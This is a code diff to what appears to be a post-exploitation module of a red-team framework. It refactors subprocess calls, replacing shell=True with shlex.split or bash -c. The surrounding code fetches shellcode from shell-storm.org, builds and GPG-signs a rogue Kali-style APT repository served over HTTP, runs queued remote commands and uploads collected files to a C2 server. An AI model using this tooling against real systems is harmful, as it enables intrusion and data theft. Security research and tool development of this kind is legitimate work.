@@ -9,6 +9,7 @@ import cmd2
 import glob
 import json
 import os
+import shlex
 import subprocess
 import sys
 import time
@@ -264,7 +265,7 @@ class PostexpMigratedCommandSet(LazyOwnCommandSet):
 
                     if confirm == 'l':
                         print_warn(f"Executing command: {selected_cmd}")
-                        subprocess.run(selected_cmd + " 2>/dev/null", shell=True)
+                        subprocess.run(["bash", "-c", selected_cmd + " 2>/dev/null"])
 
                         command_clipboard = subprocess.Popen(
                             ['xclip', '-selection', 'clipboard'],
@@ -418,7 +419,7 @@ class PostexpMigratedCommandSet(LazyOwnCommandSet):
         copy2clip(command)
         print_msg("Launching strace...")
         try:
-            subprocess.run(command, shell=True, check=True)
+            subprocess.run(shlex.split(command), check=True)
         except subprocess.CalledProcessError as e:
             print_error(f"Command failed with return code {e.returncode}.")
         except KeyboardInterrupt:
@@ -499,7 +500,7 @@ class PostexpMigratedCommandSet(LazyOwnCommandSet):
                     print_msg(f"Title: {sc[2]}, Platform: {sc[1]}, ID: {sc[3]}, Author: {sc[0]}, URL: {sc[4]}")
 
                 shellcode_id = input("[*] Select shellcode id: ")
-                subprocess.call("clear", shell=True)
+                subprocess.call(["clear"])
                 shellcode_url = f"http://shell-storm.org/shellcode/files/shellcode-{shellcode_id}.html"
                 shellcode_response = requests.get(shellcode_url).text
                 shellcode_response = shellcode_response.replace("&quot;", '"')
@@ -753,7 +754,7 @@ class PostexpMigratedCommandSet(LazyOwnCommandSet):
             for tool in required_tools:
                 if not shutil.which(tool):
                     print_warn(f"{tool} is not installed. Installing it now...")
-                    subprocess.run(f"sudo apt-get install -y {tool}", shell=True, check=True)
+                    subprocess.run(shlex.split(f"sudo apt-get install -y {tool}"), check=True)
 
             lhost = self.params['lhost']
             rhost = self.params['rhost']
@@ -763,8 +764,8 @@ class PostexpMigratedCommandSet(LazyOwnCommandSet):
             repo = f"{sessions}/apt-repo"
             os.makedirs(repo, exist_ok=True)
 
-            arch = subprocess.check_output("dpkg --print-architecture", shell=True, text=True).strip()
-            ubuntu_version = subprocess.check_output("lsb_release -cs", shell=True, text=True).strip()
+            arch = subprocess.check_output(shlex.split("dpkg --print-architecture"), text=True).strip()
+            ubuntu_version = subprocess.check_output(shlex.split("lsb_release -cs"), text=True).strip()
 
             print_msg("Resolving and downloading packages with comprehensive dependency handling...")
             downloaded_packages = set()
@@ -778,8 +779,8 @@ class PostexpMigratedCommandSet(LazyOwnCommandSet):
 
                 try:
                     deps_output = subprocess.check_output(
-                        f"apt-cache depends --recurse --no-recommends --no-suggests {package_name}",
-                        shell=True, text=True
+                        shlex.split(f"apt-cache depends --recurse --no-recommends --no-suggests {package_name}"),
+                        text=True
                     )
 
                     dependencies = set(
@@ -791,7 +792,7 @@ class PostexpMigratedCommandSet(LazyOwnCommandSet):
 
                     download_command = f"cd {repo} && apt-get download {package_name}:{arch}"
                     print_msg(f"Downloading: {package_name}")
-                    subprocess.run(download_command, shell=True, check=True)
+                    subprocess.run(["bash", "-c", download_command], check=True)
                     downloaded_packages.add(package_name)
 
                     for dep in dependencies:
@@ -799,8 +800,8 @@ class PostexpMigratedCommandSet(LazyOwnCommandSet):
                             try:
                                 dep_download_cmd = f"cd {repo} && apt-get download {dep}:{arch}"
                                 command = f"cd {repo} && apt-rdepends {package} | grep -v '^ ' | grep -v '^PreDepends' | grep -v '^Depends' | grep -v '^Recommends'"
-                                subprocess.run(dep_download_cmd, shell=True, check=True)
-                                subprocess.run(command, shell=True, check=True)
+                                subprocess.run(["bash", "-c", dep_download_cmd], check=True)
+                                subprocess.run(["bash", "-c", command], check=True)
                                 downloaded_packages.add(dep)
                             except subprocess.CalledProcessError:
                                 print_warn(f"Could not download dependency: {dep}")
@@ -813,9 +814,7 @@ class PostexpMigratedCommandSet(LazyOwnCommandSet):
 
             print_msg("Generating comprehensive APT repository index...")
             command = f"dpkg-scanpackages -a {arch} {repo} /dev/null | gzip -9c > {repo}/Packages.gz"
-            subprocess.run(command, shell=True, check=True)
-
-            print_msg("Generating Release file...")
+            subprocess.run(["bash", "-c", command], check=True)
             current_time = datetime.now(timezone.utc)
             release_content = f"""Origin: Local Repository
             Label: Local Repository
@@ -837,7 +836,7 @@ class PostexpMigratedCommandSet(LazyOwnCommandSet):
             checksum_algos = ['md5sum', 'sha1sum', 'sha256sum']
             for algo in checksum_algos:
                 try:
-                    hash_output = subprocess.check_output(f"{algo} Packages.gz", shell=True, text=True)
+                    hash_output = subprocess.check_output(shlex.split(f"{algo} Packages.gz"), text=True)
                     algo.upper()
                     release_content += f" {hash_output.split()[0]} {hash_output.split()[1]}\n"
                 except subprocess.CalledProcessError:
@@ -848,30 +847,30 @@ class PostexpMigratedCommandSet(LazyOwnCommandSet):
 
             print_msg("Signing the repository...")
             try:
-                subprocess.run("gpg --list-keys", shell=True, check=True)
+                subprocess.run(["bash", "-c", "gpg --list-keys"], check=True)
             except subprocess.CalledProcessError:
                 print_warn("No GPG key found. Generating a new key...")
-                subprocess.run('''gpg --batch --generate-key << EOF
+                subprocess.run(["bash", "-c", '''gpg --batch --generate-key << EOF
                 %no-protection
                 Key-Type: RSA
                 Key-Length: 2048
                 Name-Real: Local Repository
                 Name-Email: repo@local
                 Expire-Date: 0
-                EOF'''.replace('                ',''), shell=True, check=True)
+                EOF'''.replace('                ','')], check=True)
 
-            subprocess.run(f"gpg --batch --yes --output {repo}/InRelease --clearsign {repo}/Release", shell=True, check=True)
-            subprocess.run(f"gpg --batch --yes --output {repo}/Release.gpg --detach-sign -a {repo}/Release", shell=True, check=True)
-            subprocess.run(f"gpg --clearsign --batch --yes --output {repo}/dists/kali-rolling/InRelease {repo}/dists/kali-rolling/Release ", shell=True, check=True)
-            subprocess.run(f"gpg --detach-sign --armor --batch --yes --output {repo}/dists/kali-rolling/Release.gpg {repo}/dists/kali-rolling/Release", shell=True, check=True)
-            subprocess.run(f"gpg --export --armor > {repo}/public.key", shell=True, check=True)
-            subprocess.run(f"""mkdir -p {repo}/dists/kali-rolling/main/i18n
+            subprocess.run(shlex.split(f"gpg --batch --yes --output {repo}/InRelease --clearsign {repo}/Release"), check=True)
+            subprocess.run(shlex.split(f"gpg --batch --yes --output {repo}/Release.gpg --detach-sign -a {repo}/Release"), check=True)
+            subprocess.run(shlex.split(f"gpg --clearsign --batch --yes --output {repo}/dists/kali-rolling/InRelease {repo}/dists/kali-rolling/Release"), check=True)
+            subprocess.run(shlex.split(f"gpg --detach-sign --armor --batch --yes --output {repo}/dists/kali-rolling/Release.gpg {repo}/dists/kali-rolling/Release"), check=True)
+            subprocess.run(["bash", "-c", f"gpg --export --armor > {repo}/public.key"], check=True)
+            subprocess.run(["bash", "-c", f"""mkdir -p {repo}/dists/kali-rolling/main/i18n
             touch {repo}/dists/kali-rolling/main/i18n/Translation-en_US.xz
             touch {repo}/dists/kali-rolling/main/i18n/Translation-en.xz
-            """.replace('            ',''), shell=True, check=True)
-            subprocess.run(f"""mkdir -p {repo}/dists/kali-rolling/main/cnf
+            """.replace('            ','')], check=True)
+            subprocess.run(["bash", "-c", f"""mkdir -p {repo}/dists/kali-rolling/main/cnf
             touch {repo}/dists/kali-rolling/main/cnf/Commands-amd64.xz
-            """.replace('            ',''), shell=True, check=True)
+            """.replace('            ','')], check=True)
             os.chdir(path)
             username = ""
             password = ""
@@ -911,7 +910,7 @@ class PostexpMigratedCommandSet(LazyOwnCommandSet):
             """.replace('            ','')
             copy2clip(command)
             self.logcsv(f"apt_repo {command}")
-            subprocess.run(f"python3 -m http.server 8009 --directory {repo}", shell=True, check=True)
+            subprocess.run(shlex.split(f"python3 -m http.server 8009 --directory {repo}"), check=True)
             os.chdir(path)
 
         except subprocess.CalledProcessError as e:
@@ -1792,7 +1791,7 @@ class PostexpMigratedCommandSet(LazyOwnCommandSet):
             for command in remote_stack:
                 if confirm == 'l':
                     print_warn(f"Executing command: {command}")
-                    subprocess.run(command + " 2>/dev/null", shell=True)
+                    subprocess.run(["bash", "-c", command + " 2>/dev/null"])
 
                     command_clipboard = subprocess.Popen(
                         ['xclip', '-selection', 'clipboard'],
@@ -2187,7 +2186,7 @@ class PostexpMigratedCommandSet(LazyOwnCommandSet):
         local_output_path = os.path.join(path, "sessions", "uploads", output_filename)
 
         if confirm == 'l':
-            subprocess.run(f"cp {remote_output_path} {local_output_path}", shell=True)
+            subprocess.run(shlex.split(f"cp {remote_output_path} {local_output_path}"))
             for file in glob.glob(f"{path}/sessions/uploads/*"):
                 self.upload_file_to_c2(file, self.c2_clientid)
         elif confirm == 'r':
